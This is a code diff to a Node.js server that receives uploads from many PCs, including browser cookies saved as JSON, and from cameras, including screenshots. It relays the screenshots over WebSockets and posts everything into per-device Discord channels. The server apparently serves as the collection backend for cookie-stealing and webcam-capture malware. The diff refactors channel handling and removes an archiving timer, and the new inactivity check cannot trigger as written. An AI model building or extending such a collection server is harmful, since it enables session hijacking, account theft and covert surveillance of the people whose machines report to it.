@@ -20,13 +20,13 @@ const GUILD_ID = process.env.GUILD_ID;
 
 const CATEGORY_BASE_PC = "Все ПК";
 const CATEGORY_BASE_CAM = "Камеры";
-const ARCHIVE_CAM_CATEGORY = "Архив камер";
+const CATEGORY_ARCHIVE_CAM = "Архив камер";
 const LOG_CATEGORY = "Логи";
 const LOG_CHANNEL = "server-logs";
+
 const ONLINE_TIMEOUT = 3 * 60 * 1000;
-const PC_DISCORD_UPLOAD_INTERVAL = 60 * 1000;
-const CAMERA_DISCORD_UPLOAD_INTERVAL = 30 * 1000;
 const MAX_FILE_SIZE = 6 * 1024 * 1024;
+const CAM_INACTIVE_THRESHOLD = 2 * 60 * 1000; // 2 минуты
 
 // ---------- Состояние ----------
 const onlinePCs = {};
@@ -36,7 +36,6 @@ const channelByPC = {};
 const channelByCam = {};
 const wsCameraClients = {};
 const camLastUpload = {};
-const pcFileLastSent = {};
 
 let logCategoryCache = null;
 let logChannelCache = null;
@@ -142,9 +141,14 @@ app.post("/upload-pc", async (req, res) => {
         const guild = await bot.guilds.fetch(GUILD_ID);
         const category = await getOrCreateCategory(guild, CATEGORY_BASE_PC);
         const channelName = safeChannelName('pc', pcId);
-        const channel = channelByPC[pcId] ? await guild.channels.fetch(channelByPC[pcId]).catch(() => null) : null;
-        const finalChannel = channel || await getOrCreateTextChannel(guild, channelName, category.id);
-        channelByPC[pcId] = finalChannel.id;
+        let finalChannel = null;
+        if (channelByPC[pcId]) {
+            finalChannel = await guild.channels.fetch(channelByPC[pcId]).catch(() => null);
+        }
+        if (!finalChannel) {
+            finalChannel = await getOrCreateTextChannel(guild, channelName, category.id);
+            channelByPC[pcId] = finalChannel.id;
+        }
 
         const files = [];
         if (cookies) files.push({ attachment: Buffer.from(JSON.stringify({ cookies }, null, 2)), name: `${channelName}-cookies.json` });
@@ -176,39 +180,42 @@ app.post("/upload-cam", async (req, res) => {
         const { camId, screenshot } = req.body;
         if (!camId || !screenshot) return res.status(400).json({ error: "camId and screenshot required" });
 
-        camLastUpload[camId] = Date.now();
-
+        // Broadcast to WS clients
         if (wsCameraClients[camId]) {
-            wsCameraClients[camId].forEach(ws => { try { ws.send(JSON.stringify({ camId, screenshot })); } catch (e) { } });
+            wsCameraClients[camId].forEach(ws => { 
+                try { ws.send(JSON.stringify({ camId, screenshot })); } 
+                catch (e) { } 
+            });
         }
 
+        camLastUpload[camId] = Date.now();
+
         const guild = await bot.guilds.fetch(GUILD_ID);
-
-        // Определяем категорию: обычная или архив
-        let categoryName = CATEGORY_BASE_CAM;
-        const lastTime = camLastUpload[camId];
-        if (lastTime && Date.now() - lastTime > CAMERA_DISCORD_UPLOAD_INTERVAL*2) categoryName = ARCHIVE_CAM_CATEGORY;
-
+        // Проверка активности камеры
+        const isInactive = Date.now() - camLastUpload[camId] > CAM_INACTIVE_THRESHOLD;
+        const categoryName = isInactive ? CATEGORY_ARCHIVE_CAM : CATEGORY_BASE_CAM;
         const category = await getOrCreateCategory(guild, categoryName);
-        const channelName = safeChannelName('cam', camId);
 
-        const existingChannel = channelByCam[camId] ? await guild.channels.fetch(channelByCam[camId]).catch(() => null) : null;
-        let finalChannel;
-        if(existingChannel){
-            if(existingChannel.parentId !== category.id){
-                await existingChannel.setParent(category.id);
-            }
-            finalChannel = existingChannel;
-        } else {
+        const channelName = safeChannelName('cam', camId);
+        let finalChannel = null;
+        if (channelByCam[camId]) {
+            finalChannel = await guild.channels.fetch(channelByCam[camId]).catch(() => null);
+        }
+        if (!finalChannel || finalChannel.parentId !== category.id) {
             finalChannel = await getOrCreateTextChannel(guild, channelName, category.id);
             channelByCam[camId] = finalChannel.id;
         }
 
         const buffer = Buffer.from(screenshot, "base64");
-        if (buffer.length <= MAX_FILE_SIZE) await finalChannel.send({ files: [{ attachment: buffer, name: `${channelName}.jpg` }] });
+        if (buffer.length <= MAX_FILE_SIZE) {
+            await finalChannel.send({ files: [{ attachment: buffer, name: `${channelName}.jpg` }] });
+        }
 
         res.json({ success: true });
-    } catch (e) { await logToDiscord(`❌ Ошибка upload-cam: ${e.message}`); res.status(500).json({ error: e.message }); }
+    } catch (e) {
+        await logToDiscord(`❌ Ошибка upload-cam: ${e.message}`);
+        res.status(500).json({ error: e.message });
+    }
 });
 
 // ---------- WebSocket ----------
@@ -223,32 +230,6 @@ wss.on("connection", (ws, req) => {
         wsCameraClients[camId] = wsCameraClients[camId].filter(c => c !== ws);
     });
 });
-
-// ---------- Архивирование камер ----------
-setInterval(async () => {
-    const guild = await bot.guilds.fetch(GUILD_ID);
-    const archiveCategory = await getOrCreateCategory(guild, ARCHIVE_CAM_CATEGORY);
-    const activeCategory = await getOrCreateCategory(guild, CATEGORY_BASE_CAM);
-
-    for(const camId in camLastUpload){
-        const lastTime = camLastUpload[camId];
-        const channelId = channelByCam[camId];
-        if(!channelId) continue;
-
-        const channel = await guild.channels.fetch(channelId).catch(() => null);
-        if(!channel) continue;
-
-        const isInactive = Date.now() - lastTime > CAMERA_DISCORD_UPLOAD_INTERVAL*2;
-
-        if(isInactive && channel.parentId !== archiveCategory.id){
-            await channel.setParent(archiveCategory.id);
-            await logToDiscord(`Камера ${camId} перемещена в архив`);
-        } else if(!isInactive && channel.parentId !== activeCategory.id){
-            await channel.setParent(activeCategory.id);
-            await logToDiscord(`Камера ${camId} активна, возвращена в основную категорию`);
-        }
-    }
-}, CAMERA_DISCORD_UPLOAD_INTERVAL);
 
 // ---------- Запуск ----------
 const server = http.createServer(app);
